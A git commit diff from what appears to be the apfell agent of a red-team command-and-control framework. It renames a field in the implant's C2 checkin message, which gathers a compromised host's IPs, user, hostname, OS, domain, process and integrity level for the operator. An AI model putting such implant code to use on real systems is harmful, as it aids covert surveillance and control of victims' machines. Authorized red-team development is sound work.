27634e9812a4369bf9b9cd634e95e0b77b50e2c8
its-a-feature <codybthomas@gmail.com>
2023-05-26 15:13:37 -0500

    fixed issue with ip vs ips in dynamichttp c2 code

--- Payload_Type/apfell/apfell/agent_code/c2_profiles/dynamichttp.js
+++ Payload_Type/apfell/apfell/agent_code/c2_profiles/dynamichttp.js
@@ -366,7 +366,7 @@ class customC2 extends baseC2{
     return JSON.stringify(config, null, 2);
   }
   checkin(ip, pid, user, host, os, architecture, domain){
-    let info = {'ip':ip,'pid':pid,'user':user,'host':host,'uuid':apfell.uuid, "os": os, "architecture": architecture, "domain": domain, "action": "checkin"};
+    let info = {'ips':ip,'pid':pid,'user':user,'host':host,'uuid':apfell.uuid, "os": os, "architecture": architecture, "domain": domain, "action": "checkin"};
     info["process_name"] = apfell.procInfo.processName.js;
     info["sleep_info"] = "Sleep interval set to " + C2.interval + " and sleep jitter updated to " + C2.jitter;
     if(user === 'root'){info['integrity_level'] = 3;}
